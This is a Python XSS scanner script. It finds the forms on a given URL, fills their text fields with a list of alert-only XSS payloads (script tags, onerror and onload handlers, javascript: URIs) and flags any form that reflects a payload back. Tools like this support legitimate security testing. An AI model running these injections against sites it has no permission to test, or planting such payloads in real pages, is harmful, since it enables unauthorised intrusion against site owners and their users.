import requests
from bs4 import BeautifulSoup
import argparse


class XSSTester:
    def __init__(self):
        self.payloads = [
            '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>',
            '"><svg/onload=alert("XSS")>',
            "<iframe src=\"javascript:alert('XSS');\">",
            '\'"--><script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<input type="text" value="<script>alert(\'XSS\')</script>">',
        ]

    def test_xss(self, url):
        """Test for XSS vulnerabilities in forms on the given URL"""
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Error accessing {url}: {e}")
            return

        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        found_xss = False

        for form in forms:
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            form_url = self._get_full_url(url, action)

            for payload in self.payloads:
                data = {}
                for input_tag in form.find_all("input"):
                    input_name = input_tag.get("name")
                    if not input_name:
                        continue

                    input_type = input_tag.get("type", "text")
                    if input_type == "text":
                        data[input_name] = payload
                    elif input_type == "hidden":
                        data[input_name] = input_tag.get("value", "")

                try:
                    if method == "post":
                        response = requests.post(form_url, data=data, timeout=10)
                    else:
                        response = requests.get(form_url, params=data, timeout=10)

                    if payload in response.text:
                        print(f"[!] XSS vulnerability found in {form_url}")
                        print(f"    Payload: {payload[:50]}...")  # Show first 50 chars of payload
                        print(f"    Method: {method.upper()}")
                        found_xss = True
                        break

                except requests.RequestException as e:
                    print(f"Error testing form at {form_url}: {e}")
                    continue

        if not found_xss:
            print(f"[+] No XSS vulnerabilities found in {url}")

    def _get_full_url(self, base_url, action):
        """Construct full URL from base URL and action"""
        if action.startswith(("http://", "https://")):
            return action
        elif action.startswith("/"):
            from urllib.parse import urlparse

            parsed = urlparse(base_url)
            return f"{parsed.scheme}://{parsed.netloc}{action}"
        else:
            return f"{base_url.rstrip('/')}/{action.lstrip('/')}"


def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument("url", help="URL to test for XSS vulnerabilities")
    args = parser.parse_args()

    tester = XSSTester()
    tester.test_xss(args.url)


if __name__ == "__main__":
    main()
